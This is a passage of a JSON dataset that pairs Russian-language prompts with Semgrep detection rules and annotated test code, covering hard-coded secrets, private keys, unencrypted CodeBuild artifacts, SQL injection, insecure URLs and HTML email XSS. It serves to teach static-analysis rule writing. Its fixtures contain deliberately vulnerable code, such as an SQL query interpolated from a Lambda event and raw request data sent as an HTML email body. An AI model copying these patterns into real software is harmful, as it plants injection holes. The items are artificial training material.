    "instruction": "Создай Semgrep правило для: linkedin-client-secret\nОписание уязвимости: A gitleaks linkedin-client-secret was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: linkedin-client-secret.go\n// ruleid: linkedin-client-secret\nlinkedin_api_token = \"y1hlc6i2omng2vt3\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: linkedin-client-secret.go\n// ruleid: linkedin-client-secret\nlinkedin_api_token = \"y1hlc6i2omng2vt3\"\n• // File: another-linkedclientsecret.go\n// ruleid: linkedin-client-secret\nconst linkedinClientSecret = \"abc123def456ghijkl\"\n• // File: yetanother-go-file.go\n// ruleid: linkedin-client-secret\nvar linkedin_client_secret = \"xyz789opqrs012345\"\n\nБезопасные паттерны:  \n• // File: safe-code.go\n// idempotent: safe-code\napi_key := os.Getenv(\"LINKEDIN_API_KEY\")\n• // File: secure-code.go\n// idempotent: secure-code\nlinkedin_client_secret := getSecureCredentialFromVault()\n• // File: good-practice.go\n// idempotent: good-practice\nlinkedinClientSecret := fetchLinkedInSecretFromHsm()\n\nЛегенда аннотаций:\n- // ruleid:linkedin-client-secret: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:linkedin-client-secret: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: linkedin-client-secret\n  message: A gitleaks linkedin-client-secret was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:linkedin|linked-in)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}([a-z0-9]{16})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных секретов LinkedIn client secret в исходном коде. Регулярное выражение ищет строку, содержащую 'linkedin' или 'linked-in', за которой следует произвольная последовательность символов длиной от 0 до 20, затем символ '=' или один из нескольких операторов сравнения, после чего идет строка из 16 буквенно-цифровых символов, которые предположительно являются клиентом secret.\n\n# Ключевые элементы:\n- ID: linkedin-client-secret\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "linkedin-client-secret",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: private-key\nОписание уязвимости: A gitleaks private-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: private-key.go\n// ruleid: private-key\n[]string{`-----BEGIN PRIVATE KEY-----\nanything\n-----END PRIVATE KEY-----`,\n\t\t`-----BEGIN RSA PRIVATE KEY-----\nabcdefghijklmnopqrstuvwxyz\n-----END RSA PRIVATE KEY-----\n`,\n\t\t`-----BEGIN PRIVATE KEY BLOCK-----\nanything\n-----END PRIVATE KEY BLOCK-----`,\n\t}  # Ограничиваем длину\n\nОпасные паттерны:\n• []string{\n\t`-----BEGIN PRIVATE KEY---\nalphabet\n-----END PRIVATE KEY---\n`,\n• []string{\n\t`-----BEGIN RSA PRIVATE KEY---\nnumber\n-----END RSA PRIVATE KEY---\n`,\n• []string{\n\t`-----BEGIN PRIVATE KEY BLOCK---\ndata\n-----END PRIVATE KEY BLOCK---\n`,\n\nБезопасные паттерны:  \n• []string{\n\t`-----BEGIN PUBLIC KEY---\nalphabet\n-----END PUBLIC KEY---\n`,\n• []string{\n\t`-----BEGIN RSA PUBLIC KEY---\nnumber\n-----END RSA PUBLIC KEY---\n`,\n• []string{\n\t`-----BEGIN X509 CERTIFICATE---\ncertificate data\n-----END X509 CERTIFICATE---\n`,\n\nЛегенда аннотаций:\n- // ruleid:private-key: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:private-key: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: private-key\n  message: A gitleaks private-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)-----BEGIN[ A-Z0-9_-]{0,100}PRIVATE KEY( BLOCK)?-----[\\s\\S-]*KEY( BLOCK)?----\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска строк, начинающихся с '-----BEGIN' и заканчивающихся 'KEY' или 'BLOCK', что соответствует структуре заголовков закрытых ключей PEM формата. Регулярное выражение игнорирует регистр ('(?i)') и допускает произвольные символы между BEGIN и PRIVATE KEY/BLOCK, позволяя обнаруживать различные вариации представления закрытых ключей. Правило применимо только к языкам, поддерживающим регулярные выражения.\n\n# Ключевые элементы:\n- ID: private-key\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "private-key",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: aws-codebuild-artifacts-unencrypted\nОписание уязвимости: The CodeBuild project artifacts are unencrypted. All artifacts produced by your CodeBuild project pipeline should be encrypted to prevent them from being read if compromised.\nCWE: CWE-311: Missing Encryption of Sensitive Data\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-311: Missing Encryption of Sensitive Data\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-codebuild-artifacts-unencrypted.tf\nresource \"aws_codebuild_project\" \"fail_1\" {\n  name         = \"test-project\"\n  service_role = aws_iam_role.example.arn\n\n  # ruleid: aws-codebuild-artifacts-unencrypted\n  artifacts {\n    encryption_disabled = true\n    type                = \"CODEPIPELINE\"\n  }\n\n  environment {\n    compute_type = \"BUILD_GENERAL1_SMALL\"\n    image        = \"aws/codebuild/standard:1.0\"\n    type         = \"LINUX_CONTAINER\"\n  }\n\n  source {\n    type            = \"GITHUB\"\n    location        = \"https://github.com/mitchellh/packer.git\"\n    git_clone_depth = 1\n\n    git_submodules_config {\n      fetch_submodules = true\n    }\n  }\n}\n\nresource \"aws_codebuild_project\" \"fail_2\" {\n  name         = \"test-project\"\n  service_role = aws_iam_role.example.arn\n\n  # ruleid: aws-codebuild-artifacts-unencrypted\n  artifacts {\n    encryption_disabled = true\n    type                = \"S3\"\n  }\n\n  environment {\n    compute_type = \"BUILD_GENERAL1_SMALL\"\n    image        = \"aws/codebuild/standard:1.0\"\n    type         = \"LINUX_CONTAINER\"\n  }\n\n  source {\n    type            = \"GITHUB\"\n    location        = \"https://github.com/mitchellh/packer.git\"\n    git_clone_depth = 1\n\n    git_submodules_config {\n      fetch_submodules = true\n    }\n  }\n}\n\nresource \"aws_codebuild_project\" \"fail_3\" {\n  name         = \"test-project\"\n  service_role = aws_iam_role.example.arn\n\n  # ruleid: aws-codebuild-artifacts-unencrypted\n  artifacts {\n    encryption_disabled = true\n    type                = \"CODEPIPELINE\"\n  }\n\n  environment {\n    compute_type = \"BUILD_GENERAL1_SMALL\"\n    image        = \"aws/codebuild/standard:1.0\"\n    type         = \"LINUX_CONTAINER\"\n  }\n\n  source {\n    type            = \"GITHUB\"\n    location        = \"https://github.com/mitchellh/packer.git\"\n    git_clone_depth = 1\n\n    git_submodules_config {\n      fetch_submodules = true\n    }\n  }\n}\n\nresource \"aws_codebuild_project\" \"fail_4\" {\n  name         = \"test-project\"\n  service_role = aws_iam_role.example.arn\n\n  # ruleid: aws-cod  # Ограничиваем длину\n\nОпасные паттерны:\n• artifacts { encryption_disabled = true type = \"CODEPIPELINE\" }\n• artifacts { encryption_disabled = true type = \"S3\" }\n• secondary_artifacts { artifact_identifier = \"example-artifact-1\" type = \"CODEPIPELINE\" encryption_disabled = true }\n\nБезопасные паттерны:  \n• artifacts { type = \"S3\" encryption_disabled = false }\n• secondary_artifacts { artifact_identifier = \"example-artifact-1\" type = \"CODEPIPELINE\" encryption_disabled = false }\n• secondary_artifacts { artifact_identifier = \"example-artifact-3\" type = \"S3\" encryption_disabled = false }\n\nЛегенда аннотаций:\n- // ruleid:aws-codebuild-artifacts-unencrypted: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-codebuild-artifacts-unencrypted: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-codebuild-artifacts-unencrypted\n  patterns:\n  - pattern-inside: |\n      resource \"aws_codebuild_project\" \"$ANYTHING\" {\n        ...\n      }\n  - pattern: |\n      $ARTIFACTS {\n        ...\n        type = \"$TYPE\"\n        encryption_disabled = true\n        ...\n      }\n  - metavariable-regex:\n      metavariable: $ARTIFACTS\n      regex: ^(artifacts|secondary_artifacts)$\n  - metavariable-regex:\n      metavariable: $TYPE\n      regex: ^(CODEPIPELINE|S3)$\n  message: The CodeBuild project artifacts are unencrypted. All artifacts produced\n    by your CodeBuild project pipeline should be encrypted to prevent them from being\n    read if compromised.\n  languages:\n  - hcl\n  severity: WARNING\n  metadata:\n    category: security\n    technology:\n    - terraform\n    - aws\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A04:2021 - Insecure Design\n    cwe:\n    - 'CWE-311: Missing Encryption of Sensitive Data'\n    references:\n    - https://owasp.org/Top10/A04_2021-Insecure_Design\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/codebuild_project#encryption_disabled\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-codebuild-project-artifacts.html\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-codebuild-project.html\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS CodeBuild проекта, у которых отключена шифрация артефактов. Анализ выполняется путем поиска ресурса 'aws_codebuild_project' и последующего сопоставления блока 'artifacts' или 'secondary_artifacts', где атрибут 'encryption_disabled' установлен в true и тип артефакта ('type') равен 'CODEPIPELINE' или 'S3'. Правило использует метавариабли для обобщения имен переменных и регулярных выражений для проверки типов артефактов.\n\n# Ключевые элементы:\n- ID: aws-codebuild-artifacts-unencrypted\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-codebuild-artifacts-unencrypted",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения pg-sqli\nОписание уязвимости: Detected SQL statement that is tainted by `$EVENT` object. This could lead to SQL injection if the variable is user-controlled and not properly sanitized. In order to prevent SQL injection, use parameterized queries or prepared statements instead. You can use parameterized statements like so: `connection.query('SELECT $1 from table', [userinput])`\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: taint\nЯзык: javascript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: taint\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: pg-sqli.js\nlet response;\n\nconst prettyPrint = (ob) => JSON.stringify(ob, null, 2).replace('\\'','');\nconst timestamp = () => new Date();\n\nconst toBase64 = (msg) => Buffer.from(msg).toString('base64');\n\nconst { Client } = require('pg');\nexports.handler = async function (event, context) {\n  console.log(\"the event\");\n  console.log(event);\n\n  const client = new Client({\n    user: \"test\",\n    host: \"db\",\n    database: \"nockslots\",\n    password: \"test\",\n    port: 5432,\n  });\n\n  console.log(\"connecting to db...\");\n\n  await client.connect();\n\n  records = [];\n  event.Records.forEach((record) => {\n    const { body } = record;\n    console.log(body);\n    records.push(toBase64(body));\n  });\n\n  const query = `INSERT INTO public.messages (body, encoded_message) VALUES ('${prettyPrint(event)}', '${records[0]}');`;\n\n  console.log('the query:');\n  console.log(query);\n\n  try {\n    console.log(\"Trying the query...\");\n    // ruleid: pg-sqli\n    await client.query(query)\n    // ok: pg-sqli\n    await client.query('INSERT INTO messages (body, message) VALUES ($1, $2);', [prettyPrint(event), records[0]])\n    await client.end();\n  } catch (error) {\n    console.log('Could not add row to postgres, soz');\n    console.log(error);\n  }\n\n  return { key: JSON.stringify(records) };\n};  # Ограничиваем длину\n\nОпасные паттерны:\n• await client.query(query)\n• client.query($QUERY, ...)\n\nБезопасные паттерны:  \n• await client.query('INSERT INTO messages (body, message) VALUES ($1, $2);', [prettyPrint(event), records[0]])\n\nЛегенда аннотаций:\n- // ruleid:pg-sqli: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:pg-sqli: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: pg-sqli\n  message: >-\n    Detected SQL statement that is tainted by `$EVENT` object. This could lead to SQL injection if the\n    variable is user-controlled\n    and not properly sanitized. In order to prevent SQL injection,\n    use parameterized queries or prepared statements instead.\n    You can use parameterized statements like so:\n    `connection.query('SELECT $1 from table', [userinput])`\n  metadata:\n    references:\n    - https://node-postgres.com/features/queries\n    category: security\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    technology:\n    - aws-lambda\n    - postgres\n    - pg\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: HIGH\n    confidence: MEDIUM\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          exports.handler = function ($EVENT, ...) {\n            ...\n          }\n      - pattern-inside: |\n          function $FUNC ($EVENT, ...) {...}\n          ...\n          exports.handler = $FUNC\n      - pattern-inside: |\n          $FUNC = function ($EVENT, ...) {...}\n          ...\n          exports.handler = $FUNC\n    - pattern: $EVENT\n  pattern-sinks:\n  - patterns:\n    - focus-metavariable: $QUERY\n    - pattern-either:\n      - pattern: $DB.query($QUERY, ...)\n    - pattern-either:\n      - pattern-inside: |\n          require('pg')\n          ...\n      - pattern-inside: |\n          import 'pg'\n          ...\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска уязвимостей SQL-инъекции в PostgreSQL (pg-sqli) путем выявления SQL-запросов, которые содержат данные, полученные из объекта `$EVENT`, который может быть контролируем пользователем. Источники (`sources`) определяют место происхождения потенциально опасных данных, а синки (`sinks`) указывают на места использования этих данных в SQL-запросах. Правило использует шаблон источников, включающий объект `$EVENT`, и шаблоны синков, проверяющие наличие запросов к базе данных через библиотеку pg, где эти данные передаются напрямую в SQL-запрос.\n\n# Ключевые элементы:\n- ID: pg-sqli\n- Язык: javascript \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "pg-sqli",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения absolute-urls\nОписание уязвимости: Using absolute URLs to Salesforce Pages is bug prone. Different sandboxes and production environments will have different instance names (like \"na10\", \"na15\" etc.). Code using absolute URLs will only work when it runs in the corresponding salesforce instances. It will break as soon as it is deployed in another one. Thus only relative URLs, i.e. without the domain and subdomain names, should be used when pointing to a salesforce page.\nCWE: \nТип анализа: search\nЯзык: apex",
    "input": "Требования:\n- Язык: apex\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: AbsoluteUrls.cls\n/*\n * Test Controller with Absolute URLs\n */\npublic with sharing class AbsoluteUrls {\n\n\tpublic PageReference absoluteSalesforceUrlExample() {\n\t\t// ruleid: absolute-urls\n\t\tString strUrl = 'https://na8.salesforce.com/TestVFPage?AccountId=999';\n\t\tPageReference newUrl = new PageReference(strUrl);\n\t\tnewURL.setRedirect(true);\n\n\t\treturn newURL;\n\t}\n\n\tpublic PageReference absoluteNonSalesforceUrlExample() {\n\t\t// ok: absolute-urls\n\t\tString strUrl = 'https://www.website.com';\n\t\tPageReference newUrl = new PageReference(strUrl);\n\t\tnewURL.setRedirect(true);\n\n\t\treturn newURL;\n\t}\n\n\tpublic PageReference nonAbsoluteSalesforceUrlExample() {\n\t\t// ok: absolute-urls\n\t\tString strUrl = URL.getSalesforceBaseUrl().toExternalForm() + '/TestVFPage?AccountId=999';\n\t\tPageReference newUrl = new PageReference(strUrl);\n\t\tnewURL.setRedirect(true);\n\n\t\treturn newURL;\n\t}\n\n\t// Absolute Salesforce URL comment example\n\t// ruleid: absolute-urls\n\t// https://na8.salesforce.com/TestVFPage?AccountId=999\n\n\t// Absolute non-Salesforce URL comment example\n\t// ok: absolute-urls\n\t// https://www.website.com\n\n\t// Non-absolute Salesforce URL comment example\n\t// ok: absolute-urls\n\t// URL.getSalesforceBaseUrl().toExternalForm() + '/TestVFPage?AccountId=999\n\n\t// ruleid: absolute-urls\n\tprivate static final String ABSOLUTE_SF_URL_CONSTANT = 'https://na8.salesforce.com/TestVFPage?AccountId=999';\n\t// ok: absolute-urls\n\tprivate static final String ABSOLUTE_NON_SF_URL_CONSTANT = 'https://www.website.com';\n\t// ok: absolute-urls\n\tprivate static final String NON_ASBOLUTE_SF_URL_CONSTANT = URL.getOrgDomainUrl().toExternalForm() + '/TestVFPage?AccountId=999';\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• String strUrl = 'https://na8.salesforce.com/TestVFPage?AccountId=999';\n• // ruleid: absolute-urls\nhttps://na8.salesforce.com/TestVFPage?AccountId=999\n• private static final String ABSOLUTE_SF_URL_CONSTANT = 'https://na8.salesforce.com/TestVFPage?AccountId=999';\n\nБезопасные паттерны:  \n• String strUrl = 'https://www.website.com';\n• // ok: absolute-urls\nhttps://www.website.com\n• private static final String ABSOLUTE_NON_SF_URL_CONSTANT = 'https://www.website.com';\n\nЛегенда аннотаций:\n- // ruleid:absolute-urls: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:absolute-urls: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: absolute-urls\n    min-version: 1.44.0\n    severity: WARNING\n    languages:\n      - apex\n    metadata:\n      category: best-practice\n      references:\n      - ''\n      technology:\n      - salesforce\n    message: >-\n      Using absolute URLs to Salesforce Pages is bug prone. Different sandboxes and production\n      environments will have different instance names (like \"na10\", \"na15\" etc.). Code using\n      absolute URLs will only work when it runs in the corresponding salesforce instances. It\n      will break as soon as it is deployed in another one. Thus only relative URLs, i.e. without\n      the domain and subdomain names, should be used when pointing to a salesforce page.\n    pattern-regex: (http|https)://.*(salesforce|force|visualforce)\\.com\\.*\n    paths:\n      exclude:\n        - \"*Test*\"\n        - \"*test*\"\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска абсолютных URL-адресов, указывающих на страницы Salesforce. Оно использует регулярное выражение для сопоставления строк, содержащих схемы HTTP или HTTPS, за которыми следуют поддомены 'salesforce', 'force' или 'visualforce'. Правило применимо только к Apex-коду и исключает файлы, содержащие слова 'Test' или 'test' в пути.\n\n# Ключевые элементы:\n- ID: absolute-urls\n- Язык: apex \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "absolute-urls",
      "language": "apex",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: insecure-urlopener-open\nОписание уязвимости: Detected an unsecured transmission channel. 'URLopener.open(...)' is being used with 'http://'. Use 'https://' instead to secure the channel.\nCWE: CWE-319: Cleartext Transmission of Sensitive Information\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-319: Cleartext Transmission of Sensitive Information\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: insecure-urlopener-open.py\nfrom urllib.request import URLopener\n\ndef test1():\n    od = URLopener()\n    # ruleid: insecure-urlopener-open\n    od.open(\"http://example.com\")\n\ndef test1_ok():\n    od = URLopener()\n    # ok: insecure-urlopener-open\n    od.open(\"https://example.com\")\n\ndef test2():\n    od = URLopener()\n    # ruleid: insecure-urlopener-open\n    url = \"http://example.com\"\n    # ruleid: insecure-urlopener-open\n    od.open(url)\n\ndef test2_ok():\n    od = URLopener()\n    # ok: insecure-urlopener-open\n    url = \"https://example.com\"\n    od.open(url)\n\ndef test3():\n    # ruleid: insecure-urlopener-open\n    URLopener().open(\"http://example.com\")\n\ndef test3_ok():\n    # ok: insecure-urlopener-open\n    URLopener().open(\"https://example.com\")\n\ndef test4():\n    # ruleid: insecure-urlopener-open\n    url = \"http://example.com\"\n    # ruleid: insecure-urlopener-open\n    URLopener().open(url)\n\ndef test4_ok():\n    # ok: insecure-urlopener-open\n    url = \"https://example.com\"\n    URLopener().open(url)\n\ndef test5(url = \"http://example.com\"):\n    # ruleid: insecure-urlopener-open\n    URLopener().open(url)\n\ndef test5_ok(url = \"https://example.com\"):\n    # ok: insecure-urlopener-open\n    URLopener().open(url)\n\ndef test6(url = \"http://example.com\"):\n    od = URLopener()\n    # ruleid: insecure-urlopener-open\n    od.open(url)\n\ndef test6_ok(url = \"https://example.com\"):\n    od = URLopener()\n    # ok: insecure-urlopener-open\n    od.open(url)  # Ограничиваем длину\n\nОпасные паттерны:\n• od.open(\"http://example.com\")\n• url = \"http://example.com\"\nod.open(url)\n• URLopener().open(\"http://example.com\")\n\nБезопасные паттерны:  \n• od.open(\"https://example.com\")\n• url = \"https://example.com\"\nod.open(url)\n• URLopener().open(\"https://example.com\")\n\nЛегенда аннотаций:\n- // ruleid:insecure-urlopener-open: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-urlopener-open: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: insecure-urlopener-open\n  message: >-\n    Detected an unsecured transmission channel. 'URLopener.open(...)' is\n    being used with 'http://'. Use 'https://' instead to secure the channel.\n  metadata:\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    cwe:\n    - 'CWE-319: Cleartext Transmission of Sensitive Information'\n    references:\n    - https://docs.python.org/3/library/urllib.request.html#urllib.request.URLopener.open\n    category: security\n    technology:\n    - urllib\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  severity: WARNING\n  languages: [python]\n  fix-regex:\n    regex: '[Hh][Tt][Tt][Pp]://'\n    replacement: https://\n    count: 1\n  pattern-either:\n  - pattern: urllib.request.URLopener(...).open(\"=~/[Hh][Tt][Tt][Pp]://.*/\", ...)\n  - patterns:\n    - pattern-inside: |\n        $OPENERDIRECTOR = urllib.request.URLopener(...)\n        ...\n    - pattern: $OPENERDIRECTOR.open(\"=~/[Hh][Tt][Tt][Pp]://.*/\", ...)\n  - patterns:\n    - pattern-inside: |\n        $OPENERDIRECTOR = urllib.request.URLopener(...)\n        ...\n    - pattern: |\n        $URL = \"=~/[Hh][Tt][Tt][Pp]://.*/\"\n        ...\n        $OPENERDIRECTOR.open($URL, ...)\n  - pattern: |\n      $URL = \"=~/[Hh][Tt][Tt][Pp]://.*/\"\n      ...\n      urllib.request.URLopener(...).open($URL, ...)\n  - patterns:\n    - pattern-inside: |\n        def $FUNC(..., $URL = \"=~/[Hh][Tt][Tt][Pp]://.*/\", ...):\n          ...\n    - pattern-either:\n      - pattern: urllib.request.URLopener(...).open($URL, ...)\n      - patterns:\n        - pattern-inside: |\n            $OPENERDIRECTOR = urllib.request.URLopener(...)\n            ...\n        - pattern: $OPENERDIRECTOR.open($URL, ...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования класса URLopener из библиотеки urllib.request в Python, где метод open() вызывается с протоколом http:// вместо https://. Правило использует шаблонный поиск строк, содержащих URL с префиксом http:// внутри вызова метода open(), а также ищет случаи, когда переменная URL определяется ранее и передается в метод open(). Шаблон учитывает различные способы объявления функции и инициализации объекта URLopener.\n\n# Ключевые элементы:\n- ID: insecure-urlopener-open\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insecure-urlopener-open",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения xss-html-email-body\nОписание уязвимости: Found request data in an EmailMessage that is set to use HTML. This is dangerous because HTML emails are susceptible to XSS. An attacker could inject data into this HTML email, causing XSS.\nCWE: CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: xss-html-email-body.py\nimport logging as logger\nimport traceback\nfrom django.contrib.auth.models import User\nfrom django.conf import settings\nfrom django.core.mail import EmailMessage\nfrom django.shortcuts import render\n\nfrom smtplib import SMTPException\n\ndef notify_users_about_challenge(request):\n    \"\"\"\n    Email New Challenge Details to Users\n    \"\"\"\n    if request.user.is_authenticated() and request.user.is_superuser:\n        if request.method == \"GET\":\n            template_name = \"notification_email_data.html\"\n            return render(request, template_name)\n\n        elif request.method == \"POST\":\n            users = User.objects.exclude(email__exact=\"\").values_list(\n                \"email\", flat=True\n            )\n            subject = request.POST.get(\"subject\")\n            # ruleid: xss-html-email-body\n            body_html = request.POST.get(\"body\")\n\n            sender = settings.EMAIL_SENDER\n\n            email = EmailMessage(\n                subject,\n                body_html,\n                sender,\n                [settings.EMAIL],\n                bcc=users,\n            )\n            email.content_subtype = \"html\"\n\n            try:\n                email.send()\n                return render(\n                    request,\n                    \"notification_email_conformation.html\",\n                    {\"message\": \"All the emails are sent successfully!\"},\n                )\n            except SMTPException:\n                logger.exception(traceback.format_exc())\n                return render(\n                    request, \"notification_email_data.html\", {\"errors\": 1}\n                )\n        else:\n            return render(request, \"error404.html\")\n    else:\n        return render(request, \"error404.html\")\n\ndef send_an_email(request):\n    subject = request.POST.get(\"subject\")\n    # ok: xss-html-email-body\n    body_html = request.POST.get(\"body\")\n\n    sender = \"blah@blah.com\"\n    email = EmailMessage(\n        subject,\n        body_html,\n        sender  # Ограничиваем длину\n\nОпасные паттерны:\n• ruleid: xss-html-email-body\nbody_html = request.POST.get(\"body\")\ndjango.core.mail.EmailMessage(subject, body_html, sender, recipients)\n• django.core.mail.EmailMessage(subject, request.POST.get(\"body\"), sender, recipients)\n\nБезопасные паттерны:  \n• ok: xss-html-email-body\nbody_html = request.POST.get(\"body\")\ndjango.core.mail.EmailMessage(subject, html_template.render(context), sender, recipients)\n• data = sanitized_data(request.POST.get(\"body\"))\ndjango.core.mail.EmailMessage(subject, data, sender, recipients)\n\nЛегенда аннотаций:\n- // ruleid:xss-html-email-body: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:xss-html-email-body: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
